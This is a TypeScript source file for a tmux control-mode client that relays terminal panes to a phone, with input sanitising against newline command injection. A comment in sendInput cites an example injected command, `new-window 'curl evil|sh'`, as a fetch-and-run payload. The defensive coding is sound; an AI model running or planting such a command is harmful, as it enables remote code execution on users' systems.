// Connects to a tmux server via control mode (-CC).
// Streams pane output to the relay as sessions.
// Accepts input from the relay and injects into panes.
// Spawns new windows on demand from the phone.
//
// Protocol: tmux -CC (raw control mode)
// Reference: iTerm2 TmuxGateway.m, tmux wiki Control Mode

import * as pty from 'node-pty';
import { EventEmitter } from 'node:events';

// ─── Types ────────────────────────────────────────────────────────────────────

export interface TmuxPane {
  id:             string;  // %N (pane ID, stable for server lifetime)
  windowId:       string;  // @N
  sessionId:      string;  // $N
  pid:            number;
  currentCommand: string;
  currentPath:    string;
  width:          number;
  height:         number;
  active:         boolean;
  title:          string;
}

export interface TmuxWindow {
  id:        string;  // @N
  sessionId: string;  // $N
  name:      string;
  active:    boolean;
  layout:    string;
}

export interface TmuxSession {
  id:   string;  // $N
  name: string;
}

export interface SpawnOpts {
  name:    string;
  command: string;
  cwd?:    string;
}

// ─── Pending command queue entry ──────────────────────────────────────────────

interface PendingCommand {
  id:      number;
  resolve: (lines: string[]) => void;
  reject:  (err: Error) => void;
  lines:   string[];
}

// ─── TmuxClient ───────────────────────────────────────────────────────────────

export class TmuxClient extends EventEmitter {
  // Events emitted:
  //   'paneOutput'    (paneId: string, data: Buffer)
  //   'paneAdded'     (pane: TmuxPane)
  //   'paneRemoved'   (paneId: string)
  //   'paneRenamed'   (paneId: string, title: string)
  //   'windowAdded'   (window: TmuxWindow)
  //   'windowRemoved' (windowId: string)
  //   'ready'         ()           — initial state fully seeded
  //   'sessionsChanged' ()         — primary only: server session set changed
  //   'error'         (err: Error)
  //   'exit'          ()

  private proc:     pty.IPty | null = null;
  private lineAcc   = '';

  // Command queue — FIFO. tmux returns command responses strictly in the
  // order commands were sent, so FIFO matching is correct ONCE the single
  // unsolicited startup block (the implicit `-CC new-session` attach
  // response) has been consumed. See startup barrier below.
  private cmdQueue: PendingCommand[] = [];
  private cmdNum    = 0;
  private inBlock   = false;
  private blockId   = -1;

  // Startup barrier. `tmux -CC new-session` emits one %begin/%end block for
  // the implicit new-session command BEFORE any command we send. If a
  // configure() command is written before that block's %end arrives (the
  // pty resolves on the first byte, not the first complete block), the
  // startup %end is blind-shifted onto our first command and every
  // subsequent response is off-by-one — list-panes resolves with an empty
  // slot → "0 panes". We must drain that block before sending anything.
  private startupConsumed = false;
  private startupWaiters: Array<() => void> = [];

  // In-memory state — keyed by stable IDs
  sessions = new Map<string, TmuxSession>();
  windows  = new Map<string, TmuxWindow>();
  panes    = new Map<string, TmuxPane>();

  // Socket label for -L flag (isolated from user's own tmux)
  private readonly socketLabel = 'pocket-t';
  // Config file for the pocket-t tmux server
  private readonly configPath: string;

  constructor(
    private readonly tmuxConf: string,  // path to pocket-t tmux.conf
    // The single tmux session this control client is bound to. A tmux -CC
    // client only receives %output for its ATTACHED session, so there is
    // one TmuxClient per tmux session. `primary` create-or-attaches the
    // daemon's own `pocket-t` session and additionally does discovery
    // (list-sessions + emits 'sessionsChanged'); others attach an
    // already-existing session.
    readonly sessionName = 'pocket-t',
    private readonly primary = true,
    private readonly virtualCols = 220,
    private readonly virtualRows = 50,
  ) {
    super();
    this.configPath = tmuxConf;
  }

  // ─── Public API ─────────────────────────────────────────────────────────────

  /** Connect to (or create) the pocket-t tmux server */
  async connect(): Promise<void> {
    await this.spawnControl();
    await this.waitForStartup();
    await this.configure();
    await this.seedState();
    this.emit('ready');
  }

  /**
   * Resolve once the implicit `new-session` startup block has been fully
   * received (its %end seen). Sending commands before this point races the
   * startup %end onto the first queued command and desyncs the FIFO.
   * 2s fallback in case a tmux variant doesn't emit the block.
   */
  private waitForStartup(): Promise<void> {
    if (this.startupConsumed) return Promise.resolve();
    return new Promise((resolve) => {
      const done = () => { resolve(); };
      this.startupWaiters.push(done);
      setTimeout(() => {
        if (!this.startupConsumed) {
          this.startupConsumed = true;
          this.flushStartupWaiters();
        }
      }, 2000);
    });
  }

  private flushStartupWaiters(): void {
    const waiters = this.startupWaiters;
    this.startupWaiters = [];
    for (const w of waiters) w();
  }

  /** Disconnect cleanly */
  disconnect(): void {
    try { this.proc?.write('\n'); } catch { /* detach */ }
    try { this.proc?.kill(); } catch { /* already gone */ }
    this.proc = null;
  }

  /** Send raw bytes to a pane (user typed something on phone) */
  async sendInput(paneId: string, text: string): Promise<void> {
    // tmux -CC is a LINE-DELIMITED control protocol: cmd() writes
    // `<command>\n`. A raw \n/\r in `text` would terminate the send-keys
    // line and the remainder would execute as tmux commands (e.g.
    // `kill-server`, `new-window 'curl evil|sh'`). Never send a multi-line
    // payload as one command: split on newlines and send each line as its
    // own literal, with an explicit Enter key BETWEEN lines. The final
    // submit is owned by the caller (TmuxHost calls sendEnter()).
    // -l disables key-name lookup so "Enter" isn't treated as a key name.
    try {
      const lines = text.split(/\r\n|\r|\n/);
      for (let i = 0; i < lines.length; i++) {
        if (i > 0) await this.cmd(`send-keys -t ${paneId} Enter`);
        if (lines[i].length > 0) {
          await this.cmd(`send-keys -t ${paneId} -l ${shellQuote(lines[i])}`);
        }
      }
    } catch (e) {
      console.error('[tmux] sendInput failed:', (e as Error).message);
    }
  }

  /** Send Enter key to a pane */
  async sendEnter(paneId: string): Promise<void> {
    try { await this.cmd(`send-keys -t ${paneId} Enter`); }
    catch (e) { console.error('[tmux] sendEnter failed:', (e as Error).message); }
  }

  /** Send Ctrl-C to a pane */
  async sendInterrupt(paneId: string): Promise<void> {
    try { await this.cmd(`send-keys -t ${paneId} C-c`); }
    catch (e) { console.error('[tmux] sendInterrupt failed:', (e as Error).message); }
  }

  /** Spawn a new window running a command */
  async spawnWindow(opts: SpawnOpts): Promise<string> {
    const sessionId = this.firstSessionId();
    if (!sessionId) throw new Error('No tmux session available');

    const cwdFlag = opts.cwd ? `-c ${shellQuote(opts.cwd)}` : '';
    let lines: string[] = [];
    try {
      lines = await this.cmd(
        `new-window -dP -F '#{window_id}' -t ${sessionId}: -n ${shellQuote(opts.name)} ${cwdFlag} ${shellQuote(opts.command)}`
      );
    } catch (e) {
      throw new Error(`Failed to create window: ${(e as Error).message}`);
    }
    const windowId = lines[0]?.trim();
    if (!windowId) throw new Error('Failed to create window');
    return windowId;
  }

  /** Kill a pane */
  async killPane(paneId: string): Promise<void> {
    try { await this.cmd(`kill-pane -t ${paneId}`); }
    catch (e) { console.error('[tmux] killPane failed:', (e as Error).message); }
  }

  /** Kill a window */
  async killWindow(windowId: string): Promise<void> {
    try { await this.cmd(`kill-window -t ${windowId}`); }
    catch (e) { console.error('[tmux] killWindow failed:', (e as Error).message); }
  }

  /** Get the current screen content of a pane (for reconnect repaint) */
  async capturePane(paneId: string, lines = 2000): Promise<Buffer> {
    try {
      const output = await this.cmd(
        `capture-pane -p -e -J -t ${paneId} -S -${lines}`
      );
      return Buffer.from(output.join('\n'), 'utf-8');
    } catch (e) {
      console.error('[tmux] capturePane failed:', (e as Error).message);
      return Buffer.alloc(0);
    }
  }

  /** Focus a pane (user tapped it on phone) */
  async selectPane(paneId: string): Promise<void> {
    try { await this.cmd(`select-pane -t ${paneId}`); }
    catch (e) { console.error('[tmux] selectPane failed:', (e as Error).message); }
  }

  /** Focus a window */
  async selectWindow(windowId: string): Promise<void> {
    try { await this.cmd(`select-window -t ${windowId}`); }
    catch (e) { console.error('[tmux] selectWindow failed:', (e as Error).message); }
  }

  /** All tmux session names on the server (discovery — primary client). */
  async listSessions(): Promise<string[]> {
    try {
      const lines = await this.cmd(`list-sessions -F '#{session_name}'`);
      return lines.map((l) => l.trim()).filter(Boolean);
    } catch (e) {
      console.error('[tmux] listSessions failed:', (e as Error).message);
      return [];
    }
  }

  // ─── Internal: spawn the control mode process ────────────────────────────────

  private async spawnControl(): Promise<void> {
    return new Promise((resolve, reject) => {
      // tmux -CC control mode calls tcgetattr() on its stdin, so it MUST be
      // attached to a real PTY (a plain pipe → "tcgetattr failed" exit 1).
      // iTerm2 does the same — control client runs on a pty.
      // primary: create-or-attach the daemon's own session.
      // per-session: attach an existing session (term-*) for its %output.
      const attachArgs = this.primary
        ? ['new-session', '-A', '-s', this.sessionName]
        : ['attach-session', '-t', this.sessionName];
      this.proc = pty.spawn('tmux', [
        '-L', this.socketLabel,
        '-f', this.configPath,
        '-CC',
        ...attachArgs,
      ], {
        name: 'xterm-256color',
        cols: this.virtualCols,
        rows: this.virtualRows,
        cwd:  process.env.HOME || '/',
        env:  process.env as Record<string, string>,
      });

      let started = false;

      this.proc.onData((d: string) => {
        if (!started) { started = true; resolve(); }
        this.feed(d);
      });

      this.proc.onExit(({ exitCode }) => {
        console.log(`[tmux] process exited (code=${exitCode})`);
        // Drop the dead handle so cmd()/writes fail fast (reject) instead
        // of throwing "EIO: i/o error, write" against a closed pty, and
        // unblock any in-flight awaiters.
        this.proc = null;
        const dead = this.cmdQueue.splice(0);
        for (const p of dead) p.reject(new Error('tmux process exited'));
        this.emit('exit');
        if (!started) reject(new Error(`tmux exited before ready (code=${exitCode})`));
      });
    });
  }

  // ─── Internal: configure client after attach ─────────────────────────────────

  private async configure(): Promise<void> {
    // Set virtual size — don't affect other clients
    await this.cmd(`refresh-client -C ${this.virtualCols}x${this.virtualRows}`).catch(() => {});

    // Enable flow control + don't shrink other clients' windows
    await this.cmd(`refresh-client -f pause-after=3,wait-exit,ignore-size`).catch(() => {});

    // Modern tmux: size newest active client wins (don't shrink for phone)
    await this.cmd(`set-option -g window-size latest`).catch(() => {});
  }

  // ─── Internal: seed in-memory state ─────────────────────────────────────────

  private seeding      = false;
  private reseedQueued = false;
  private seededOnce   = false;

  async seedState(): Promise<void> {
    // Non-reentrant: %sessions-changed can fire while a seed is in flight.
    // Overlapping seeds flood the control channel and desync the command
    // FIFO (list-panes response gets lost → 0 panes). Serialize instead.
    if (this.seeding) { this.reseedQueued = true; return; }
    this.seeding = true;
    try {
      await this.doSeed();
    } catch (e) {
      console.error('[tmux] seed failed:', (e as Error).message);
    } finally {
      this.seeding = false;
      if (this.reseedQueued) {
        this.reseedQueued = false;
        setTimeout(() => this.seedState().catch(() => {}), 150);
      }
    }
  }

  private async doSeed(): Promise<void> {
    // Scope every list to THIS client's own session — a per-session client
    // must only surface its own panes, otherwise every client would emit
    // paneAdded for every pane (N× duplicates).
    const tgt = shellQuote(this.sessionName);

    // Sessions (just our own)
    const sessLines = await this.cmd(
      `list-sessions -F '#{session_id} #{session_name}'`
    );
    for (const line of sessLines) {
      const [id, ...nameParts] = line.trim().split(' ');
      if (id?.startsWith('$') && nameParts.join(' ') === this.sessionName) {
        this.sessions.set(id, { id, name: nameParts.join(' ') });
      }
    }

    // Windows (this session only)
    const winLines = await this.cmd(
      `list-windows -t ${tgt} -F '#{window_id} #{session_id} #{window_name} #{window_active} #{window_layout}'`
    );
    for (const line of winLines) {
      const parts = line.trim().split(' ');
      if (parts.length >= 5) {
        const [windowId, sessionId, name, active, ...layoutParts] = parts;
        if (windowId?.startsWith('@')) {
          this.windows.set(windowId, {
            id:        windowId,
            sessionId,
            name,
            active:    active === '1',
            layout:    layoutParts.join(' '),
          });
        }
      }
    }

    // Panes — diff against previous so a re-seed (from %sessions-changed)
    // still surfaces brand-new terminals even without a %window-add.
    const seen = new Set<string>();
    const paneLines = await this.cmd(
      `list-panes -s -t ${tgt} -F '#{pane_id} #{window_id} #{session_id} #{pane_pid} #{pane_current_command} #{pane_current_path} #{pane_width} #{pane_height} #{pane_active} #{pane_title}'`
    );
    for (const line of paneLines) {
      const parts = line.trim().split(' ');
      if (parts.length >= 9 && parts[0]?.startsWith('%')) {
        const [paneId, windowId, sessionId, pidStr, currentCommand, currentPath, widthStr, heightStr, activeStr, ...titleParts] = parts;
        seen.add(paneId);
        const wasKnown = this.panes.has(paneId);
        const pane = {
          id:             paneId,
          windowId,
          sessionId,
          pid:            Number(pidStr) || 0,
          currentCommand: currentCommand || '',
          currentPath:    currentPath || '',
          width:          Number(widthStr) || this.virtualCols,
          height:         Number(heightStr) || this.virtualRows,
          active:         activeStr === '1',
          title:          titleParts.join(' '),
        };
        this.panes.set(paneId, pane);
        if (!wasKnown && this.seededOnce) this.emit('paneAdded', pane);
      }
    }
    // Panes that vanished since the last seed
    for (const paneId of [...this.panes.keys()]) {
      if (!seen.has(paneId)) {
        this.panes.delete(paneId);
        if (this.seededOnce) this.emit('paneRemoved', paneId);
      }
    }
    this.seededOnce = true;

    console.log(
      `[tmux] seeded: ${this.sessions.size} sessions, ` +
      `${this.windows.size} windows, ` +
      `${this.panes.size} panes`
    );
  }

  // ─── Internal: raw command → %begin/%end response ───────────────────────────

  private cmd(text: string): Promise<string[]> {
    // An empty line written to a tmux -CC client is the DETACH signal, and
    // an empty command yields "ambiguous command:" %error — either one
    // kills the daemon. Never send a blank command.
    if (!text || !text.trim()) return Promise.resolve([]);
    return new Promise((resolve, reject) => {
      if (!this.proc) {
        reject(new Error('Not connected'));
        return;
      }
      const id = ++this.cmdNum;
      this.cmdQueue.push({ id, resolve, reject, lines: [] });
      this.proc.write(text + '\n');
    });
  }

  // ─── Internal: control-stream data handler (from the PTY) ───────────────────

  private feed(d: string): void {
    // Accumulate into line buffer
    this.lineAcc += d;

    let nl: number;
    while ((nl = this.lineAcc.indexOf('\n')) !== -1) {
      const raw = this.lineAcc.slice(0, nl);
      this.lineAcc = this.lineAcc.slice(nl + 1);
      this.onLine(raw.replace(/\r$/, ''));  // strip trailing CR
    }
  }

  // ─── Internal: line handler — the core state machine ────────────────────────

  private onLine(line: string): void {
    // ── Guard block markers ───────────────────────────────────────────────────
    if (line.startsWith('%begin ')) {
      this.inBlock = true;
      const parts = line.split(' ');
      this.blockId = Number(parts[2]) || -1;
      return;
    }

    if (line.startsWith('%end ') || line.startsWith('%error ')) {
      const isError = line.startsWith('%error');
      this.inBlock = false;
      this.blockId = -1;

      // First block is the implicit `-CC new-session` attach response —
      // not a reply to anything we queued. Consume it and release the
      // startup barrier so configure()/seedState() can now send safely.
      if (!this.startupConsumed) {
        this.startupConsumed = true;
        this.flushStartupWaiters();
        return;
      }

      const pending = this.cmdQueue.shift();
      if (pending) {
        if (isError) {
          pending.reject(new Error(pending.lines.join('\n') || 'tmux command error'));
        } else {
          pending.resolve(pending.lines);
        }
      }
      return;
    }

    // ── Inside a command response block ──────────────────────────────────────
    // Everything between %begin and %end/%error is verbatim command output —
    // tmux does NOT interleave async notifications inside a block. Buffer
    // every line, including those starting with '%': pane IDs are `%N`, so
    // `list-panes -F '#{pane_id} ...'` rows legitimately start with '%'.
    if (this.inBlock) {
      const pending = this.cmdQueue[0];
      if (pending) pending.lines.push(line);
      return;
    }

    // ── Async notifications ───────────────────────────────────────────────────
    this.handleNotification(line);
  }

  // ─── Internal: notification dispatch ────────────────────────────────────────

  private handleNotification(line: string): void {
    if (line.startsWith('%output ')) {
      this.handleOutput(line);
      return;
    }

    if (line.startsWith('%extended-output ')) {
      // %extended-output %pane age ... : payload
      const colonIdx = line.indexOf(' : ');
      if (colonIdx !== -1) {
        const header = line.slice(0, colonIdx).split(' ');
        const paneId = header[1];
        const payload = line.slice(colonIdx + 3);
        if (paneId?.startsWith('%')) {
          this.emit('paneOutput', paneId, decodeOctal(payload));
        }
      }
      return;
    }

    if (line.startsWith('%pause ')) {
      const paneId = line.split(' ')[1];
      if (paneId) {
        // Flow control: resume immediately (we handle backpressure at WS layer)
        this.cmd(`refresh-client -A '${paneId}:continue'`).catch(() => {});
      }
      return;
    }

    if (line.startsWith('%window-add ')) {
      const windowId = line.split(' ')[1];
      if (windowId) this.onWindowAdded(windowId);
      return;
    }

    if (line.startsWith('%unlinked-window-add ')) {
      // A window in ANOTHER session — that session has its own control
      // client; not ours to seed.
      return;
    }

    if (line.startsWith('%unlinked-window-close ')) {
      return;  // another session's window — not ours
    }

    if (line.startsWith('%window-close ')) {
      const windowId = line.split(' ')[1];
      if (windowId) this.onWindowRemoved(windowId);
      return;
    }

    if (line.startsWith('%sessions-changed')) {
      // Re-seed our own session, and (primary only) tell the host to
      // reconcile the per-session client pool — a session was created
      // or destroyed somewhere on the server.
      this.seedState().catch(() => {});
      if (this.primary) this.emit('sessionsChanged');
      return;
    }

    if (line.startsWith('%layout-change ')) {
      const parts = line.split(' ');
      const windowId = parts[1];
      if (windowId && this.windows.has(windowId)) {
        const win = this.windows.get(windowId)!;
        win.layout = parts.slice(2).join(' ');
      }
      return;
    }

    if (line.startsWith('%exit')) {
      this.emit('exit');
      return;
    }

    // Other notifications — ignored
  }

  // ─── Internal: %output handler ───────────────────────────────────────────────

  private handleOutput(line: string): void {
    // Format: %output %pane-id <octal-escaped-payload>
    // Split on first two spaces only — payload may contain spaces
    const firstSpace  = line.indexOf(' ');           // after %output
    const secondSpace = line.indexOf(' ', firstSpace + 1);  // after %pane-id

    if (firstSpace === -1 || secondSpace === -1) return;

    const paneId  = line.slice(firstSpace + 1, secondSpace);
    const payload = line.slice(secondSpace + 1);

    if (!paneId.startsWith('%')) return;

    const decoded = decodeOctal(payload);
    this.emit('paneOutput', paneId, decoded);
  }

  // ─── Internal: window lifecycle ─────────────────────────────────────────────

  private async onWindowAdded(windowId: string): Promise<void> {
    if (!windowId) return;
    try {
      const lines = await this.cmd(
        `list-windows -a -F '#{window_id} #{session_id} #{window_name} #{window_active} #{window_layout}' -t ${windowId}`
      );
      for (const line of lines) {
        const parts = line.trim().split(' ');
        if (parts[0] === windowId) {
          const [wid, sessionId, name, active, ...layoutParts] = parts;
          const win: TmuxWindow = {
            id:        wid,
            sessionId,
            name,
            active:    active === '1',
            layout:    layoutParts.join(' '),
          };
          this.windows.set(wid, win);
          this.emit('windowAdded', win);

          // Also pick up new panes in this window
          await this.onPanesAdded(wid);
        }
      }
    } catch {
      // Window may have closed before we queried it
    }
  }

  private onWindowRemoved(windowId: string): void {
    this.windows.delete(windowId);
    this.emit('windowRemoved', windowId);

    // Remove panes belonging to this window
    for (const [paneId, pane] of this.panes) {
      if (pane.windowId === windowId) {
        this.panes.delete(paneId);
        this.emit('paneRemoved', paneId);
      }
    }
  }

  private async onPanesAdded(windowId: string): Promise<void> {
    try {
      const lines = await this.cmd(
        `list-panes -t ${windowId} -F '#{pane_id} #{window_id} #{session_id} #{pane_pid} #{pane_current_command} #{pane_current_path} #{pane_width} #{pane_height} #{pane_active} #{pane_title}'`
      );
      for (const line of lines) {
        const parts = line.trim().split(' ');
        if (parts.length >= 9 && parts[0]?.startsWith('%')) {
          const [paneId, wid, sessionId, pidStr, currentCommand, currentPath, widthStr, heightStr, activeStr, ...titleParts] = parts;
          if (!this.panes.has(paneId)) {
            const pane: TmuxPane = {
              id:             paneId,
              windowId:       wid,
              sessionId,
              pid:            Number(pidStr) || 0,
              currentCommand: currentCommand || '',
              currentPath:    currentPath || '',
              width:          Number(widthStr) || this.virtualCols,
              height:         Number(heightStr) || this.virtualRows,
              active:         activeStr === '1',
              title:          titleParts.join(' '),
            };
            this.panes.set(paneId, pane);
            this.emit('paneAdded', pane);
          }
        }
      }
    } catch {
      // Panes may have closed before query
    }
  }

  // ─── Internal: helpers ───────────────────────────────────────────────────────

  private firstSessionId(): string | undefined {
    return this.sessions.keys().next().value;
  }
}

// ─── Utilities ────────────────────────────────────────────────────────────────

/**
 * Decode tmux's octal escaping.
 * Characters < 0x20 and backslash are encoded as \NNN (octal).
 * Everything else passes through as raw bytes.
 */
export function decodeOctal(payload: string): Buffer {
  const bytes: number[] = [];
  let i = 0;
  while (i < payload.length) {
    if (
      payload[i] === '\\' &&
      i + 3 < payload.length &&
      isOctalDigit(payload[i + 1]) &&
      isOctalDigit(payload[i + 2]) &&
      isOctalDigit(payload[i + 3])
    ) {
      bytes.push(parseInt(payload.slice(i + 1, i + 4), 8));
      i += 4;
    } else {
      bytes.push(payload.charCodeAt(i));
      i++;
    }
  }
  return Buffer.from(bytes);
}

function isOctalDigit(c: string): boolean {
  return c >= '0' && c <= '7';
}

/**
 * Shell-quote a string for use in a tmux command sent over stdin.
 *
 * Defense-in-depth: strip NUL and CR/LF first. tmux -CC is line-delimited
 * (cmd() writes `<command>\n`), so an embedded \r/\n would break out of the
 * quoted argument and let the rest execute as tmux commands. Callers that
 * need multi-line input (sendInput) split on newlines themselves; stripping
 * here also protects spawn/window names, cwd and command args.
 */
function shellQuote(s: string): string {
  const safe = s.replace(/[\x00\r\n]/g, '');
  return "'" + safe.replace(/'/g, "'\\''") + "'";
}
